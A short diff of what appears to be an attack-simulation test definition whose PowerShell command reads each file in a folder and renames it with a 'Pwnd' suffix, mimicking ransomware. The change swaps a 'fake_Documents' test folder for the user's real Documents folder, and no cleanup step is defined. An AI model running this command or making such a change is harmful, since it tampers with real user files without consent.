@@ -2,7 +2,7 @@
   executors:
   - cleanup: []
     command: '
-$TargetFolder="$($env:USERPROFILE)\Documents\fake_Documents";
+$TargetFolder="$($env:USERPROFILE)\Documents";
 foreach($f in Get-ChildItem $TargetFolder) {
     Get-Content -Path $f.fullname -TotalCount 1;
     Rename-Item -Path $f.fullname -NewName ($f.fullname + "Pwnd");
